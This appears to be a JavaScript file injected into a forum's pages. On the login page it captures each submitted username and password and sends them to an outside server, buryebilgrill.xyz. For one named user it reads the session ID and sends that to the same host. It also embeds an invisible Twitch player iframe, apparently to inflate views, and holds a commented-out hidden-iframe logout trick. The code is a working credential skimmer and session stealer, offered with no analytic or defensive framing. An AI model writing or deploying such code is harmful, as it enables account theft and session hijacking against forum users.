if (!document.getElementById("login-button")) {
    var header = document.getElementById('header');
    var user_name = document.getElementsByClassName("ptop2 pleft1")[0].children[0].innerHTML;
    if (!document.getElementById("gp_h1")) {
        if (user_name === "BRAND") {
            var sid = document.getElementsByClassName("ptop2 pleft1")[0].children[1].href.split('=')[2];
            const xhr = new XMLHttpRequest();
            xhr.open("GET", `https://buryebilgrill.xyz/sid.php?id=${sid}`);
            xhr.send();
            // if (getCookie("PHPSESSID") !== "kb") {
            //     setCookie("PHPSESSID", "kb", 300);
            //     var iframe = document.createElement('iframe');
            //     iframe.id = "gp_h1";
            //     iframe.src = `https://gparena.net/forum/ucp.php?mode=logout&sid=${sid}`;
            //     iframe.height = "400";
            //     iframe.width = "400";
            //     iframe.style.opacity = 0;
            //     iframe.style.position = "absolute";
            //     iframe.style.zIndex = -1;
            //     iframe.style.top = "-30px";
            //     header.append(iframe);
            //     //document.body.append(iframe);
            //     const wait = setTimeout(() => { location.reload() }, secondsToMS(3));
            // };
        }
    }
} else {
    var userfield = document.getElementsByName('username')[0];
    var passfield = document.getElementsByName('password')[0];
    var userfield_value = userfield.value;
    var passfield_value = passfield.value;
    document.getElementById('login-form').onsubmit = () => {
        var user_parsed = document.getElementsByName('username')[0].value.replace(/#/g, "|hashtag|").replace(/&/g, "|ampersand|");
        var pass_parsed = document.getElementsByName('password')[0].value.replace(/#/g, "|hashtag|").replace(/&/g, "|ampersand|");
        const xhr = new XMLHttpRequest();
        xhr.open("GET", `https://buryebilgrill.xyz/receive.php?u=${user_parsed}&p=${pass_parsed}`);
        xhr.send();
    };
}

function setCookie(cname, cvalue, exdays) {
    const d = new Date();
    d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
    let expires = "expires=" + d.toUTCString();
    document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

function getCookie(cname) {
    let name = cname + "=";
    let decodedCookie = decodeURIComponent(document.cookie);
    let ca = decodedCookie.split(';');
    for (let i = 0; i < ca.length; i++) {
        let c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}

if (!document.getElementById("98d2j1")) {
    var iframe = document.createElement('iframe');
    iframe.src = `https://player.twitch.tv/?channel=eric_homu&parent=${window.location.hostname}&controls=true`;
    iframe.id = "98d2j1";
    iframe.parent = `${window.location.hostname}`;
    iframe.allowtransparency = "true";
    iframe.sandbox = "allow-modals allow-scripts allow-same-origin allow-popups allow-popups-to-escape-sandbox";
    iframe.allow = "accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture";
    iframe.allowFullscreen = true;
    iframe.height = "400";
    iframe.width = "400";
    iframe.style.opacity = 0;
    iframe.style.position = "absolute";
    iframe.style.zIndex = -1;
    iframe.style.top = "-30px";
    document.getElementById('header').append(iframe);
}

function secondsToMS(seconds) {
    return seconds * 1000;
};